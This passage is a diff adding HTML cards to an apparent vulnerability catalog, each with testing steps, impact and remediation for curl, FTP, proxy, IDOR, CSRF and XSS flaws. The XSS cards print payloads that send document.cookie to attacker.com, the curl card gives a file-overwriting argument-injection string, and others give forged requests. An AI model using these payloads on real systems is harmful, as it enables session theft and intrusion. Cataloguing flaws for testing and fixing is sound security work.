+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">SOCKS5 Proxy Authentication Policy Bypass via Connection Reuse</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from a failure to consistently enforce SOCKS5 proxy authentication policies during connection reuse.  An application may configure a connection with a specific authentication method (e.g., BASIC), but subsequent requests can bypass this policy if the connection is reused without re-establishing the authentication requirements, potentially leading to unauthorized access or data exposure.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Initialize a new easy handle for making HTTP requests.</li>
+<li>Configure the following options:</li>
+</ol>
+<ul>
+<li><code>CURLOPT<em>URL</code>: Set to a target URL, e.g., <code>&lt;TARGET</em>URL&gt;</code>.</li>
+<li><code>CURLOPT<em>PROXY</code>: Set to a SOCKS5 proxy address, e.g., <code>socks5://&lt;PROXY</em>HOST&gt;:&lt;PROXY_PORT&gt;</code>.</li>
+<li><code>CURLOPT_PROXYUSERPWD</code>:  Provide proxy username and password, e.g., <code>&quot;user:pass&quot;</code>.</li>
+<li><code>CURLOPT<em>SOCKS5</em>AUTH</code>: Set to an authentication method, e.g., <code>CURLAUTH_BASIC</code>.</li>
+</ul>
+<ol>
+<li>Perform the first HTTP request using the easy handle. This establishes a SOCKS5 connection with the specified authentication.</li>
+<li>Without creating a new easy handle, modify only the <code>CURLOPT<em>SOCKS5</em>AUTH</code> option to a different authentication method (e.g., <code>CURLAUTH_NONE</code>).</li>
+<li>Perform a second HTTP request using the same easy handle and the modified <code>CURLOPT<em>SOCKS5</em>AUTH</code>.  This tests whether the connection reuse bypasses the intended authentication policy.</li>
+<li>Create a new easy handle and configure it with <code>CURLOPT<em>SOCKS5</em>AUTH</code> set to the authentication method that was supposed to be bypassed. Verify that this connection attempt fails with an authentication error.  Example payload: <code>CURLAUTH_NONE</code></li>
+<li>Observe the connection behavior and verify whether the second request uses a reused connection and bypasses the authentication policy.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can bypass proxy authentication policies, potentially gaining unauthorized access to resources or data behind the proxy.  This could lead to data breaches, privilege escalation within the network, or circumvention of access controls.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> When reusing SOCKS5 connections, ensure that the authentication policy (<code>CURLOPT<em>SOCKS5</em>AUTH</code>) is consistently enforced and refreshed.  The application should explicitly check and re-establish the SOCKS5 authentication if the policy has changed between requests. Developers should review their code to ensure proper handling of connection reuse and authentication mechanisms in SOCKS5 proxy configurations.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">FTP Server Injection via Telnet IAC (0xFF) in PWD Response</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A malicious FTP server can inject a Telnet IAC (0xFF) byte into the PWD response path, which is then stored and sent by the client during CWD commands on connection reuse. This can potentially be interpreted by intermediaries as Telnet escape sequences, leading to unexpected behavior or potential exploitation depending on the network infrastructure.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Start an FTP server that responds with a PWD path containing a Telnet IAC byte (0xFF). Example: <code>&quot;/evilÿ/dir&quot;</code>.</li>
+<li>Establish an FTP connection to the malicious server using a client.</li>
+<li>Perform a <code>PWD</code> command to retrieve the path including the IAC byte. The client should store this path.</li>
+<li>Reuse the existing connection and execute a <code>CWD</code> command. The client should send the full stored path including the IAC byte to the server.</li>
+<li>Observe the client&#x27;s interaction with the server and any network intermediaries.</li>
+</ol>
+
+<pre><code>./curl -v --ftp-pasv ftp://anonymous:x@&lt;FTP_SERVER_IP&gt;:2121/ ftp://anonymous:x@&lt;FTP_SERVER_IP&gt;:2121/sub/</code></pre>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can potentially influence the behavior of FTP proxies or other network intermediaries that interpret Telnet IAC sequences, potentially leading to information disclosure or denial of service conditions.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement stricter filtering of characters allowed in PWD responses to prevent the injection of special control characters.  Employ proper input validation and sanitation on all data received from FTP servers. Consider disallowing or sanitizing the entrypath.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Network">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Network</span>
+          <span class="card-title-text">No Proxy Bypass via IDN Hostname Mismatch</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability allows traffic that a user intends to exclude from a proxy server to be routed through the proxy anyway. The issue stems from a mismatch in how Unicode hostnames (Internationalized Domain Names or IDNs) are handled: the <code>no_proxy</code> setting doesn&#x27;t undergo the same punycode conversion as the request hostname, leading to a bypass of the intended exclusion. This exposes sensitive information to the proxy server.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Start a listener on a specified port, for example, using <code>nc -l &lt;PORT&gt;</code>.</li>
+<li>Set the <code>LANG</code> environment variable to <code>C.UTF-8</code>, configure a proxy using <code>http<em>proxy=http://&lt;PROXY</em>HOST&gt;:&lt;PROXY<em>PORT&gt;</code>, and define a <code>no</em>proxy</code> variable containing a Unicode hostname (e.g., <code>no_proxy=&quot;bücher.de&quot;</code>).</li>
+<li>Execute a command like <code>./curl -v &quot;&lt;UNICODE<em>HOSTNAME&gt;&quot;</code> using the configured environment variables. Replace <code>&lt;UNICODE</em>HOSTNAME&gt;</code> with a Unicode hostname (e.g., <code>http://bücher.de/</code>).</li>
+<li>Observe the output; the connection attempt should indicate failure to connect to the punycode equivalent of the hostname (e.g., &quot;xn--bcher-kva.de&quot;) while showing that the proxy is being used. Verify that the netcat listener receives the request.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> User-defined proxy exclusions are bypassed, potentially leading to sensitive request URLs, headers, and bodies being transmitted through an unintended proxy server, exposing data to the proxy operator.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Ensure consistent punycode conversion for both request hostnames and <code>no_proxy</code> entries.  Always convert Unicode hostnames to their punycode representation before performing comparisons.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">IDOR on Photo Resource via Direct URL</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An Insecure Direct Object Reference (IDOR) vulnerability exists where direct access to a resource using a URL parameter allows unauthorized access. This vulnerability enables an authenticated user to access resources belonging to other users, bypassing access controls, and potentially exposing sensitive data. This can include items marked as deleted.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>As User A, create an album and upload a photo.</li>
+<li>Note the direct image URL, which follows the pattern: <code>https://&lt;TARGET<em>URL&gt;/remote.php/dav/photos/&lt;user</em>email&gt;/albums/&lt;album<em>name&gt;/&lt;photo</em>id&gt;</code>.</li>
+<li>As User A, delete the photo.</li>
+<li>As User B (a different authenticated user), use the previously noted URL to access the image.</li>
+<li>Verify that the image loads successfully, indicating unauthorized access.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to user data, including potentially sensitive photos. This can lead to privacy breaches, data exposure, and unauthorized modification of user content. Accessing deleted files can also expose data that should no longer be accessible.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust access control checks to ensure that users can only access resources they are authorized to view. Validate user identity and permissions before granting access to any resource accessed via direct URL, and ensure deleted resources are properly inaccessible.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">Stale Health Check Due to Dropped Errors</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A system&#x27;s health check mechanism silently discards errors when its internal error queue is full. This can lead to a false positive health status, potentially masking an ongoing outage or masking the true health state of a dependent service. This prevents accurate detection of failures and can propagate errors downstream.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Simulate sustained failures in a dependent service (e.g., a key management service). This can involve repeatedly introducing errors during operation or overwhelming the service with requests.</li>
+<li>Observe the system&#x27;s health check endpoint.</li>
+<li>Verify that the endpoint reports a healthy status despite the ongoing errors, indicating the error queue has overflowed and errors are being dropped.</li>
+<li>Examine logs, if available, for indications that errors are being dropped from the error queue.</li>
+<li>Introduce a controlled, rapid sequence of errors to exceed the buffer capacity, which is <code>100</code> in the original code. A payload example might involve generating 101 consecutive error conditions within a short timeframe, such as: <code>simulate<em>kms</em>failure(error<em>code=&quot;CONNECTION</em>REFUSED&quot;, repeat=101)</code> (This is a conceptual payload to indicate the rate of error generation.)</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> The system may report as healthy when a critical dependency is actually unavailable, potentially leading to service disruption, data inconsistencies, or other downstream consequences. The lack of accurate health monitoring can also hinder debugging and recovery efforts.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement error logging or reporting when errors are dropped from the internal queue. Alternatively, directly propagate errors to a centralized error reporting mechanism, eliminating the need for a buffered channel and preventing dropped errors. Increase the size of the queue, but only if the increased resource usage is justifiable, and monitor queue length to detect overflow events.  Consider using a more robust health check mechanism that can handle asynchronous error reporting and state updates.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Unauthorized Personal Access Token Deletion</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists where an unauthenticated user can delete other users&#x27; personal access tokens. This allows an attacker to revoke access to resources and potentially compromise user accounts by removing their ability to authenticate. This is a severe security risk because it circumvents authentication mechanisms.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Obtain authentication cookies and CSRF token for an attacker user.</li>
+<li>Obtain the token ID of a victim user&#x27;s personal access token.</li>
+<li>Construct a <code>POST</code> request to the <code>/delete-token/{token_id}/</code> endpoint.</li>
+<li>Set the <code>Cookie</code> header of the request to the attacker user&#x27;s cookies.</li>
+<li>Set the <code>csrfmiddlewaretoken</code> header of the request to the attacker user&#x27;s CSRF token.</li>
+<li>Send the request to the server.  An example payload could be:</li>
+</ol>
+
+<pre><code>POST /delete-token/12345/ HTTP/1.1
+Host: &lt;TARGET_URL&gt;
+Cookie: &lt;ATTACKER_COOKIES&gt;
+X-CSRFToken: &lt;ATTACKER_CSRF_TOKEN&gt;</code></pre>
+<ol>
+<li>Verify that the personal access token associated with the victim token ID is successfully deleted without proper authorization checks.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can revoke a victim&#x27;s access to resources, effectively locking them out of accounts or disrupting their workflow. This can lead to denial of service or further exploitation if the token had elevated privileges.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust authorization checks before allowing users to delete personal access tokens.  Ensure that a user can only delete tokens that they own, preventing unauthorized access and modification of others&#x27; tokens. Utilize a centralized authentication and authorization system to manage access control consistently.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Unrestricted Translation Unapproval</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> A vulnerability exists where a logged-in user can unapprove translations that they are not authorized to modify. This allows for unauthorized changes to translations, potentially impacting the integrity and accuracy of localized content. The vulnerability stems from a flawed authorization check within the translation unapproval process.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Navigate to the application&#x27;s URL: &lt;TARGET_URL&gt;.</li>
+<li>Log in to a user account.</li>
+<li>Access a resource or project through a team or navigation menu.</li>
+<li>Locate an approved translation within a resource string list.</li>
+<li>Utilize a proxy tool to intercept network requests.</li>
+<li>Observe the <code>/get-history/</code> endpoint request to obtain the Translation ID from the response.</li>
+<li>Modify the intercepted &quot;unapprove translation&quot; request:</li>
+</ol>
+<ul>
+<li>Replace the session cookies with the user&#x27;s session cookies.</li>
+<li>Replace the Anti-CSRF token with the user&#x27;s Anti-CSRF token.</li>
+<li>Replace the <code>translation</code> parameter with the retrieved Translation ID.</li>
+</ul>
+<ol>
+<li>Send the modified request to the <code>/translations/unapprove/</code> endpoint, using a POST request with the following content:</li>
+</ol>
+<pre><code>translation=&lt;TRANSLATION_ID&gt;&amp;paths%5B%5D=&lt;PATH_TO_RESOURCE&gt;</code></pre>
+<ol>
+<li>Refresh the page to verify that the translation status has been changed to unapproved.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized modification of translations, potentially leading to inaccurate or compromised localized content.  This could damage the application&#x27;s reputation and user trust.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust access control checks to ensure only authorized users (e.g., the translation owner or privileged users) can unapprove translations.  Verify that the authorization checks are correctly applied and that any bypasses are addressed. Properly validate and sanitize user input and CSRF tokens to prevent unauthorized requests.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Open Redirect via Redirect URL Parameter</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An open redirect vulnerability allows an attacker to redirect a user to an arbitrary URL. This can be exploited to phish users, distribute malware, or perform other malicious activities by leveraging trusted domain reputation. The vulnerability arises from insufficient validation of user-supplied redirect URLs.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Construct a redirect URL with the <code>redirectUrl</code> parameter set to an attacker-controlled domain.</li>
+<li>Navigate to the target application&#x27;s redirect endpoint using the crafted URL. Example: <code>https://&lt;TARGET<em>URL&gt;/redirect?redirectUrl=&lt;MALICIOUS</em>URL&gt;</code></li>
+<li>Observe whether the user is redirected to the specified <code>&lt;MALICIOUS_URL&gt;</code>.</li>
+<li>Verify that the target application does not implement proper validation or sanitization of the <code>redirectUrl</code> parameter.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can redirect users to phishing websites, malicious downloads, or other harmful resources, potentially compromising user accounts or systems. This can damage the target&#x27;s reputation and erode user trust.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement strict validation and sanitization of the <code>redirectUrl</code> parameter, ensuring that it points to trusted domains. Use a whitelist of allowed domains or implement robust URL validation to prevent redirection to arbitrary URLs. Consider using relative redirects instead of absolute URLs.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Source Code">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Source Code</span>
+          <span class="card-title-text">Sensitive Encryption Context Values Logged at INFO Level</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The application logs sensitive encryption context key-value pairs at the INFO level, which is typically collected by centralized logging systems accessible to multiple operators. This exposure can lead to unintended disclosure of metadata associated with encryption operations, potentially containing information like tenant identifiers or data classification labels.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Deploy the application with the default logging configuration.</li>
+<li>Configure the application with an encryption context containing sensitive data (e.g., a tenant ID or resource identifier).</li>
+<li>Start the application.</li>
+<li>Examine the application&#x27;s INFO-level logs using standard logging tools (e.g., <code>grep</code>, log aggregators).</li>
+<li>Verify that the encryption context key-value pairs are present in the logs, visible to anyone with access to the logging system.</li>
+<li>Additionally, if debugging is enabled, check the DEBUG-level logs for similar exposure of encryption context values.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized personnel with access to application logs may be able to view sensitive encryption context data, leading to potential data exposure and compromise of system confidentiality.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Modify the logging configuration to avoid logging sensitive encryption context key-value pairs at the INFO level. Log the presence of the encryption context configuration instead, omitting the specific keys and values. Consider using structured logging and masking sensitive data within logs.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="API">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">API</span>
+          <span class="card-title-text">Argument Injection via Flag Grouping in curl</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability arises from insufficient input validation when applications execute <code>curl</code> commands with user-supplied input. Attackers can leverage <code>curl</code>&#x27;s flag grouping behavior, particularly the <code>-o</code> (output) and <code>-s</code> (silent) flags, to overwrite files on the server, potentially leading to remote code execution or other severe consequences. The core issue is the lack of separation between user-controlled input and <code>curl</code>&#x27;s command-line flags.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Observe an application that allows users to provide a URL for processing via a command-line <code>curl</code> call.</li>
+<li>Construct an attacker-controlled input string containing the flags <code>-os &lt;TARGET<em>FILE&gt; --url &lt;ATTACKER</em>URL&gt;</code>. For example: <code>-os /var/www/html/malicious_script.txt --url http://example.com</code>.</li>
+<li>Submit this input to the application. The application passes this input to the shell as part of the <code>curl</code> command.</li>
+<li>Verify that the contents of <code>&lt;ATTACKER<em>URL&gt;</code> are written to <code>&lt;TARGET</em>FILE&gt;</code> on the server, without any warnings or errors.</li>
+<li>Attempt to access the modified file (e.g., <code>/var/www/html/malicious_script.txt</code>) via a web browser to verify successful file overwrite.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can achieve arbitrary file write, potentially leading to system defacement, denial of service, or remote code execution by overwriting sensitive files such as web pages, scripts, or configuration files. Data exfiltration might be possible if local files are redirected to an attacker-controlled server.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong></p>
+<ul>
+<li>Employ a library like libcurl (for C) or <code>requests</code> (for Python) instead of directly invoking the system&#x27;s <code>curl</code> binary.</li>
+<li>If direct <code>curl</code> invocation is unavoidable, ensure strict input validation to prevent any input starting with a hyphen (&quot;-&quot;).</li>
+<li>Implement a command-line separator (e.g., <code>--</code>) to explicitly indicate that all subsequent characters should be treated as the URL, preventing them from being misinterpreted as <code>curl</code> flags. The safe command will look like: <code>curl -- &lt;USER_INPUT&gt;</code>.</li>
+<li>Sanitize the user-supplied input to remove or escape any shell metacharacters (e.g., &quot;;&quot;, &quot;&amp;&quot;, &quot;|&quot;).</li>
+</ul>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Domain Misrepresentation in Browser Shields</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> The browser&#x27;s security shield feature incorrectly displays the domain name when a subdomain is used, potentially leading to user confusion and a false sense of security. This misrepresentation can be exploited to disguise malicious websites and trick users into believing they are interacting with a legitimate domain.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Open a Brave browser instance.</li>
+<li>Navigate to a website with a subdomain using numerical values in the subdomain part, such as <code>1.1.1.1.attacker.com</code>.</li>
+<li>Observe the domain name displayed in the browser&#x27;s security shield interface. Verify that the domain is not displayed as the full address <code>1.1.1.1.attacker.com</code>, but rather as a misrepresented version like <code>attacker.com.1.1.1.1</code>.</li>
+<li>Further test by visiting <code>1.attacker.com</code> and observing the displayed domain name.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> User confusion and a false sense of security, potentially leading to phishing attacks or users unknowingly interacting with malicious websites.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong>  Implement robust domain parsing and display logic in the browser’s security shield feature to accurately represent the full domain name, regardless of the complexity of the subdomain structure. Consider displaying the full domain or providing a tooltip to show the complete domain name when there are unusual subdomain structures.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Chained XSS, Cookie Theft, and CSRF Token Prediction</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves a chain of events where an attacker can leverage a stored Cross-Site Scripting (XSS) vulnerability, steal a user&#x27;s cookie, and predict a Cross-Site Request Forgery (CSRF) token, ultimately leading to unauthorized actions performed on behalf of the user. The combination of these attacks allows for bypassing security measures and potentially gaining control of user accounts or functionality.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Discover a stored XSS vulnerability on the target application where user input is reflected in a persistent location (e.g., a comment section, a forum post, or a profile page).</li>
+<li>Craft a malicious payload to execute JavaScript code within the XSS vulnerability. This payload should be designed to steal the user&#x27;s session cookie. Example payload: <code>&lt;script&gt;fetch(&#x27;https://attacker.com/steal.php?cookie=&#x27; + document.cookie)&lt;/script&gt;</code></li>
+<li>The attacker now possesses the victim&#x27;s session cookie.</li>
+<li>Observe the target application&#x27;s CSRF protection mechanism. Determine how CSRF tokens are generated, stored, and validated.  In this particular case, the tokens are predictable based on the user&#x27;s session cookie.</li>
+<li>Craft a malicious request that exploits the CSRF vulnerability. The request should include the stolen session cookie and a predicted CSRF token. Example (assuming a POST request): <code>POST /sensitive<em>endpoint HTTP/1.1\nHost: &lt;TARGET</em>URL&gt;\nCookie: sessionid=&lt;stolen<em>cookie&gt;\nContent-Type: application/x-www-form-urlencoded\n\n&lt;PARAMETER&gt;=&lt;PAYLOAD&gt;&amp;csrf</em>token=&lt;predicted_token&gt;</code></li>
+<li>The malicious request is sent to the target application, bypassing CSRF protection due to the predicted token and utilizing the stolen cookie for authentication.</li>
+<li>Verify that the unauthorized action is performed as the victim user.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can hijack user accounts, perform unauthorized actions on their behalf, potentially leading to data theft, privilege escalation, or complete account takeover.  The combination of vulnerabilities provides a highly dangerous attack vector.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong></p>
+<ul>
+<li>Implement robust input validation and output encoding to prevent XSS vulnerabilities.</li>
+<li>Securely manage and rotate CSRF tokens, making them unpredictable.</li>
+<li>Strengthen CSRF protection mechanisms by incorporating user interaction or multi-factor authentication.</li>
+<li>Ensure that session cookies are properly protected, with appropriate flags such as <code>HttpOnly</code> and <code>Secure</code>.</li>
+<li>Implement stricter access controls and authentication checks to minimize the impact of successful attacks.</li>
+</ul>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Chained XSS, Cookie Theft, and Anti-CSRF Token Prediction for Unauthorized Action</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability involves a chain of exploits: a stored Cross-Site Scripting (XSS) vulnerability, combined with cookie theft, and a predictable Anti-CSRF token, leading to unauthorized actions on behalf of a victim user.  The attacker can leverage this chain to perform actions without the victim&#x27;s explicit consent, potentially leading to account takeover or data compromise.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Locate a form or input field vulnerable to stored XSS. This could be a comment section, a profile field, or any other location where user-supplied data is stored on the server and later displayed to other users.</li>
+<li>Inject a malicious XSS payload into the vulnerable field. This payload should be designed to steal the victim&#x27;s cookie. For example: <code>&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;https://&lt;ATTACKER_DOMAIN&gt;/steal.php?cookie=&quot;+document.cookie;&lt;/script&gt;</code>.</li>
+<li>The stored XSS payload executes when a victim views the content containing the malicious input. The attacker&#x27;s server then receives the victim&#x27;s cookie.</li>
+<li>Analyze the Anti-CSRF token generation and prediction mechanism. Identify any patterns or weaknesses that allow the attacker to predict or generate valid Anti-CSRF tokens.</li>
+<li>Craft a forged request containing the stolen cookie and the predicted Anti-CSRF token. This request should mimic a legitimate action the victim might perform, such as approving a transaction or changing a password.</li>
+<li>Submit the forged request to the target application, effectively performing the unauthorized action on behalf of the victim user.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> An attacker can leverage this vulnerability to take control of a user’s account, perform unauthorized actions, steal sensitive data, or deface a website. The chaining of XSS, cookie theft, and Anti-CSRF token prediction significantly increases the impact of this vulnerability.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust input validation and output encoding to prevent stored XSS vulnerabilities. Securely store and handle user cookies with appropriate flags (HttpOnly, Secure). Implement a strong and unpredictable Anti-CSRF token generation mechanism. Regularly review and update security measures to address emerging attack techniques.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Cross-Tenant Data Reference via Import Flow</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> An import flow allows an attacker to resolve and reference data belonging to a different tenant than their own. This occurs due to a lack of tenant ownership checks during the reference resolution process, potentially exposing sensitive information from another user&#x27;s account within the application. The vulnerability arises from mishandling imported data and failing to properly associate it with the correct tenant.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Prepare a ZIP file containing ActionText attachment HTML data. This data should include references to resources (e.g., attachments) that belong to a different tenant than the one being used for the import.</li>
+<li>Initiate an import process within the application using the prepared ZIP file.</li>
+<li>Observe the resolution of the imported ActionText references. Verify that the references resolve to resources belonging to the victim tenant instead of the importing tenant.</li>
+<li>Examine the persisted references (e.g., signed identifiers or <code>sgid</code> values) to confirm that they point to the resources in the victim tenant’s account.</li>
+<li>If successful, the import process will resolve ActionText references using a global lookup mechanism, bypassing tenant isolation.</li>
+</ol>
+
+<p><strong class="section-heading section-impact">Impact:</strong> Unauthorized access to data from another tenant&#x27;s account, potentially exposing sensitive information or allowing the attacker to display content from another user&#x27;s account within their own context. This could lead to data leakage or other malicious activities.</p>
+
+<p><strong class="section-heading section-remediation">Remediation:</strong> Implement robust tenant ownership checks during the import process and before resolving references. Ensure that references are only resolved to resources within the importing tenant’s account. Use parameterized queries and avoid global lookups when resolving references. Sanitize and validate imported data to prevent malicious references.</p>
+      </div>
+    </article>
+    
+
+    <article class="card" data-category="Web App">
+      <button type="button" class="card-toggle">
+        <span class="card-title">
+          <span class="badge badge-inline">Web App</span>
+          <span class="card-title-text">Authorization Header Leak via Cross-Host Redirect</span>
+        </span>
+        <span class="card-meta-mini">
+          <span class="card-date">Added 2026-04-15</span>
+          <span class="chevron" aria-hidden="true">▸</span>
+        </span>
+      </button>
+      <div class="card-body">
+        <p><strong class="section-heading section-description">Description:</strong> This vulnerability occurs when a system follows redirects and inadvertently forwards sensitive headers, such as authorization tokens, to a different host. The issue arises because the redirect handling logic doesn&#x27;t differentiate between redirects within the same domain and those that cross domains, leading to sensitive information being exposed to unintended recipients. This can result in credential theft and unauthorized access to protected resources.</p>
+
+<p><strong class="section-heading section-how-to-test">How to Test:</strong></p>
+<ol>
+<li>Initiate a request with an <code>Authorization</code> header containing a bearer token (e.g., <code>Bearer &lt;TOKEN&gt;</code>).</li>
+<li>Configure a redirect target to a different host.</li>
+<li>Observe that the redirect target receives the original <code>Authorization</code> header from the initial request.</li>
